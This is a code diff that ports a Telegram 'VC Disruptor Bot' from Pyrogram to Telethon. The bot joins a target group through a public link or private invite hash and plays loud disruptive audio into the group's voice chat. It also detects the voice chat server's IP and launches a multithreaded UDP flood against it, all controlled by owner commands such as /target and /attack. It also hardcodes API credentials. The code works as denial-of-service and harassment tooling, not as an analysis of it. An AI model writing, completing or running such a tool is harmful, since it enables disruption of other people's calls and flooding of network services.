@@ -11,8 +11,11 @@ import sys
 import wave
 import numpy as np
 
-from pyrogram import Client, filters
-from pyrogram.types import Message
+from telethon import TelegramClient, events
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
+from telethon.errors import FloodWaitError
+
 from pytgcalls import PyTgCalls
 from pytgcalls.types import AudioPiped
 
@@ -25,6 +28,10 @@ OWNER_ID = 7302427268
 
 # 🔴🔴🔴 APNA SESSION_STRING YAHAN DAALO 🔴🔴🔴
 SESSION_STRING = "BQAN3s...apna_session_string..."
+
+# Bot Account Credentials (User Account)
+API_ID = 6
+API_HASH = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
 
 AUDIO_DURATION = 20
 AUDIO_AMPLITUDE = 0.95
@@ -193,24 +200,24 @@ def generate_disruptive_audio(duration_sec=AUDIO_DURATION,
     buf.seek(0)
     return buf
 
-# ─── BOT HANDLERS ───
+# ─── BOT HANDLERS (Telethon) ───
 
 def owner_only(func):
-    async def wrapper(client, message: Message):
+    async def wrapper(event):
         try:
-            if message.from_user.id != OWNER_ID:
-                await message.reply("❌ Unauthorized!")
+            if event.sender_id != OWNER_ID:
+                await event.reply("❌ Unauthorized!")
                 return
         except:
-            await message.reply("❌ Error identifying user.")
+            await event.reply("❌ Error identifying user.")
             return
-        return await func(client, message)
+        return await func(event)
     return wrapper
 
 @owner_only
-async def start_cmd(client, message: Message):
+async def start_cmd(event):
     text = """
-🤖 **VC Disruptor Bot**
+🤖 **VC Disruptor Bot (Telethon)**
 
 🎯 `/target <link>` — Set target group
 ⚔️ `/attack` — Start attack
@@ -220,10 +227,10 @@ async def start_cmd(client, message: Message):
 ⚙️ `/set <param> <value>` — Change setting
 🔄 `/reset` — Reset defaults
 """
-    await message.reply(text)
+    await event.reply(text)
 
 @owner_only
-async def status_cmd(client, message: Message):
+async def status_cmd(event):
     text = f"""
 📊 **Status**
 ─────────────
@@ -234,48 +241,63 @@ Attack: {'✅ Active' if bot_state['is_attacking'] else '❌ Idle'}
 Audio: {AUDIO_DURATION}s | Tone: {TONE_FREQUENCY}Hz
 UDP: {UDP_DURATION}s | Threads: {UDP_THREADS}
 """
-    await message.reply(text)
+    await event.reply(text)
 
 @owner_only
-async def target_cmd(client, message: Message):
-    if len(message.command) < 2:
-        await message.reply("❌ Usage: /target <group_link_or_id>")
+async def target_cmd(event):
+    parts = event.raw_text.split()
+    if len(parts) < 2:
+        await event.reply("❌ Usage: /target <group_link_or_id>")
         return
     
-    link = message.text.split(" ", 1)[1].strip()
-    await message.reply(f"[🔗] Processing: {link}")
+    link = parts[1].strip()
+    await event.reply(f"[🔗] Processing: {link}")
     
     try:
         app = bot_state["app"]
+        
         if link.startswith("http") or link.startswith("t.me"):
             try:
-                chat = await app.join_chat(link)
+                # Join private group
+                if "t.me/+" in link:
+                    hash_code = link.split("/")[-1]
+                    await app(ImportChatInviteRequest(hash_code))
+                else:
+                    username = link.split("/")[-1]
+                    await app(JoinChannelRequest(username))
+            except FloodWaitError as e:
+                await event.reply(f"[!] Flood wait: {e.seconds}s")
+                return
             except:
+                # Already member, just get chat
                 username = link.split("/")[-1]
-                chat = await app.get_chat(username)
+                chat = await app.get_entity(username)
         else:
-            chat = await app.get_chat(int(link))
+            # Direct ID
+            chat = await app.get_entity(int(link))
         
+        # Store target info
         bot_state["target_id"] = chat.id
-        bot_state["target_name"] = chat.title
+        bot_state["target_name"] = chat.title if hasattr(chat, 'title') else str(chat.id)
         bot_state["status"] = "target_set"
         save_bot_config()
-        await message.reply(f"[✅] Target: **{chat.title}**\nID: `{chat.id}`")
+        
+        await event.reply(f"[✅] Target: **{bot_state['target_name']}**\nID: `{chat.id}`")
     except Exception as e:
-        await message.reply(f"[!] Error: {e}")
+        await event.reply(f"[!] Error: {e}")
 
 @owner_only
-async def attack_cmd(client, message: Message):
+async def attack_cmd(event):
     if bot_state["is_attacking"]:
-        await message.reply("⚠️ Attack already running!")
+        await event.reply("⚠️ Attack already running!")
         return
     
     if not bot_state["target_id"]:
-        await message.reply("❌ No target set! Use /target first.")
+        await event.reply("❌ No target set! Use /target first.")
         return
     
     chat_id = bot_state["target_id"]
-    await message.reply(f"🚀 **Attacking {bot_state['target_name']}...**")
+    await event.reply(f"🚀 **Attacking {bot_state['target_name']}...**")
     
     bot_state["is_attacking"] = True
     bot_state["status"] = "attacking"
@@ -285,7 +307,7 @@ async def attack_cmd(client, message: Message):
     bot_state["stop_event"] = stop_event
     
     try:
-        await message.reply("[🔍] Detecting VC IP (15s)...")
+        await event.reply("[🔍] Detecting VC IP (15s)...")
         vc_ip, vc_port = detect_vc_ip(15)
         bot_state["vc_ip"] = vc_ip
         
@@ -297,14 +319,14 @@ async def attack_cmd(client, message: Message):
         pytgcalls = bot_state["pytgcalls"]
         
         await pytgcalls.join_group_call(chat_id, AudioPiped(audio_buf))
-        await message.reply(f"[✅] Audio playing for {AUDIO_DURATION}s")
+        await event.reply(f"[✅] Audio playing for {AUDIO_DURATION}s")
         
         if vc_ip and vc_port:
             threading.Thread(
                 target=lambda: start_udp_flood(vc_ip, vc_port, UDP_DURATION, UDP_THREADS, stop_event),
                 daemon=True
             ).start()
-            await message.reply(f"[🌊] UDP flood: {vc_ip}:{vc_port}")
+            await event.reply(f"[🌊] UDP flood: {vc_ip}:{vc_port}")
         
         await asyncio.sleep(AUDIO_DURATION + 2)
         
@@ -316,18 +338,18 @@ async def attack_cmd(client, message: Message):
         stop_udp_flood(stop_event)
         
         elapsed = int(time.time() - bot_state["attack_start"])
-        await message.reply(f"[✅] Attack complete! Duration: {elapsed}s")
+        await event.reply(f"[✅] Attack complete! Duration: {elapsed}s")
         
     except Exception as e:
-        await message.reply(f"[❌] Error: {e}")
+        await event.reply(f"[❌] Error: {e}")
     finally:
         bot_state["is_attacking"] = False
         bot_state["status"] = "target_set"
 
 @owner_only
-async def stop_cmd(client, message: Message):
+async def stop_cmd(event):
     if not bot_state["is_attacking"]:
-        await message.reply("ℹ️ No active attack.")
+        await event.reply("ℹ️ No active attack.")
         return
     
     if bot_state.get("stop_event"):
@@ -341,10 +363,10 @@ async def stop_cmd(client, message: Message):
     bot_state["is_attacking"] = False
     bot_state["status"] = "idle"
     bot_state["stop_event"] = None
-    await message.reply("[⏹️] Attack stopped.")
+    await event.reply("[⏹️] Attack stopped.")
 
 @owner_only
-async def settings_cmd(client, message: Message):
+async def settings_cmd(event):
     text = f"""
 📋 **Settings**
 ─────────────
@@ -355,16 +377,17 @@ tone: {TONE_FREQUENCY}Hz
 amplitude: {AUDIO_AMPLITUDE}
 stealth: {STEALTH_MODE}
 """
-    await message.reply(text)
+    await event.reply(text)
 
 @owner_only
-async def set_cmd(client, message: Message):
-    if len(message.command) < 3:
-        await message.reply("❌ Usage: /set <param> <value>\nExample: /set duration 30")
+async def set_cmd(event):
+    parts = event.raw_text.split()
+    if len(parts) < 3:
+        await event.reply("❌ Usage: /set <param> <value>\nExample: /set duration 30")
         return
     
-    param = message.command[1].lower()
-    value = message.command[2]
+    param = parts[1].lower()
+    value = parts[2]
     
     global AUDIO_DURATION, UDP_DURATION, UDP_THREADS, TONE_FREQUENCY, STEALTH_MODE
     
@@ -382,14 +405,14 @@ async def set_cmd(client, message: Message):
             val = converter(value)
             globals()[var_name] = val
             save_bot_config()
-            await message.reply(f"[✅] {var_name} = {val}")
+            await event.reply(f"[✅] {var_name} = {val}")
         except:
-            await message.reply(f"[!] Invalid value for {param}")
+            await event.reply(f"[!] Invalid value for {param}")
     else:
-        await message.reply(f"[!] Valid params: {', '.join(changes.keys())}")
+        await event.reply(f"[!] Valid params: {', '.join(changes.keys())}")
 
 @owner_only
-async def reset_cmd(client, message: Message):
+async def reset_cmd(event):
     global AUDIO_DURATION, AUDIO_AMPLITUDE, TONE_FREQUENCY, UDP_THREADS, UDP_DURATION, STEALTH_MODE
     AUDIO_DURATION = 20
     AUDIO_AMPLITUDE = 0.95
@@ -402,13 +425,13 @@ async def reset_cmd(client, message: Message):
     bot_state["vc_ip"] = None
     if os.path.exists(CONFIG_FILE):
         os.remove(CONFIG_FILE)
-    await message.reply("[✅] Reset to defaults.")
+    await event.reply("[✅] Reset to defaults.")
 
 # ─── MAIN ───
 
 async def main():
     print("\n" + "="*50)
-    print("  🚀 VC DISRUPTOR BOT")
+    print("  🚀 VC DISRUPTOR BOT (Telethon)")
     print("="*50 + "\n")
     
     load_bot_config()
@@ -418,12 +441,19 @@ async def main():
         print("[!] @SessionStringBot se lo")
         sys.exit(1)
     
-    print("[📡] Starting user account...")
-    app = Client("vc_session", session_string=SESSION_STRING, in_memory=True)
+    # Telethon Client (User Account)
+    print("[📡] Starting user account (Telethon)...")
+    app = TelegramClient(
+        "vc_session",
+        API_ID,
+        API_HASH,
+        session_string=SESSION_STRING
+    )
     await app.start()
     user = await app.get_me()
     print(f"[👤] Logged in as: {user.first_name} (ID: {user.id})")
     
+    # PyTgCalls with Telethon
     print("[📞] Starting PyTgCalls...")
     pytgcalls = PyTgCalls(app)
     await pytgcalls.start()
@@ -432,17 +462,38 @@ async def main():
     bot_state["app"] = app
     bot_state["pytgcalls"] = pytgcalls
     
-    print("[🤖] Starting Telegram Bot...")
-    bot = Client("bot", bot_token=BOT_TOKEN, api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
+    # Register Telethon handlers
+    @app.on(events.NewMessage(pattern='/start'))
+    async def start_handler(event):
+        await start_cmd(event)
     
-    bot.on_message(filters.command("start"))(start_cmd)
-    bot.on_message(filters.command("status"))(status_cmd)
-    bot.on_message(filters.command("target"))(target_cmd)
-    bot.on_message(filters.command("attack"))(attack_cmd)
-    bot.on_message(filters.command("stop"))(stop_cmd)
-    bot.on_message(filters.command("settings"))(settings_cmd)
-    bot.on_message(filters.command("set"))(set_cmd)
-    bot.on_message(filters.command("reset"))(reset_cmd)
+    @app.on(events.NewMessage(pattern='/status'))
+    async def status_handler(event):
+        await status_cmd(event)
+    
+    @app.on(events.NewMessage(pattern='/target'))
+    async def target_handler(event):
+        await target_cmd(event)
+    
+    @app.on(events.NewMessage(pattern='/attack'))
+    async def attack_handler(event):
+        await attack_cmd(event)
+    
+    @app.on(events.NewMessage(pattern='/stop'))
+    async def stop_handler(event):
+        await stop_cmd(event)
+    
+    @app.on(events.NewMessage(pattern='/settings'))
+    async def settings_handler(event):
+        await settings_cmd(event)
+    
+    @app.on(events.NewMessage(pattern='/set'))
+    async def set_handler(event):
+        await set_cmd(event)
+    
+    @app.on(events.NewMessage(pattern='/reset'))
+    async def reset_handler(event):
+        await reset_cmd(event)
     
     print("\n" + "="*50)
     print("  ✅ BOT IS RUNNING!")
@@ -450,15 +501,12 @@ async def main():
     print("="*50 + "\n")
     
     try:
-        await bot.start()
-        while True:
-            await asyncio.sleep(10)
+        await app.run_until_disconnected()
     except KeyboardInterrupt:
         print("\n[!] Shutting down...")
     finally:
-        await bot.stop()
         await pytgcalls.stop()
-        await app.stop()
+        await app.disconnect()
         print("[✓] Clean exit.")
 
 if __name__ == "__main__":
